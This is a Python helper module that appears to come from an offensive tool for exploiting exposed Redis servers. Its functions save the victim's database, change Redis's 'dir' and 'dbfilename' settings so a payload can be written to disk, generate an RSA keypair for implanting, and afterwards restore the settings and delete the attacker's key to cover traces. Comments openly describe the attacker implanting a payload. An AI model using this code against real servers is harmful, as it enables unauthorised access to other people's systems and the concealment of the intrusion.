from .common import get_assume_defaults_value

from os import chmod
from pathlib import Path
from Crypto.PublicKey import RSA

from redis.exceptions import ResponseError



# Saves the old data to "backup.rdb" file
# This function returns the old config dir
# It would be required in the later stage
# once the attacker has implanted the
# payload!
def save_old_data(pipeline):

    assume_defaults = get_assume_defaults_value()

    # Save old data
    pipeline.config_get("dir")
    pipeline.config_set("dbfilename", "backup.rdb")
    dir = pipeline.execute()[0]["dir"]

    # print ("\ndir:", dir)

    pipeline.save()
    pipeline.flushall()

    try:
        pipeline.execute()
    except ResponseError as e:
        print ("Error:", str(e))
        print (f"\nMost probably the permissions to write to the current config dir ('{dir}') are missing!\n")

        proceed = "N"

        if not assume_defaults:
            proceed = input("\nOld DB not yet saved. Do you still wish to continue? (default='no') [y/N] ") or proceed

        if proceed.lower() != "y":
            pipeline.config_set("dir", dir)
            pipeline.execute()

            print ("Exiting...")
            return None

    return dir



# Restores the config (dir & dbfilename)
# and removes the key set by the attacker
def do_post_attack_restoration(pipeline, key, dir, dbfilename = "backup.rdb"):

    pipeline.unlink(key)
    pipeline.config_set("dir", dir)
    pipeline.config_set("dbfilename", dbfilename)

    pipeline.execute()



# Generates RSA pub-priv keypair
# It's a 2048 bits key
# By default it is stored in "/tmp/keys"
def generate_rsa_keys(keys_dir):

    key = RSA.generate(2048)

    Path(keys_dir).mkdir(parents = True, exist_ok = True)

    with open(f"{keys_dir}/private.key", "wb") as content_file:
        chmod(f"{keys_dir}/private.key", 0o600)
        content_file.write(key.exportKey("PEM"))

    pubkey = key.publickey()

    with open(f"{keys_dir}/public.key", "wb") as content_file:
        content_file.write(pubkey.exportKey("OpenSSH"))

    print (f"\nRSA keypair has been saved to '{keys_dir}' directory.\nMake sure to store them safely if you plan to use these keys for personal use!")



# TODO: Get rid of this:
# Mostly it's not needed...
# Gets the hostname from the redis/pipeline object.
def get_hostname(conn):
    return conn.connection_pool.connection_kwargs["host"]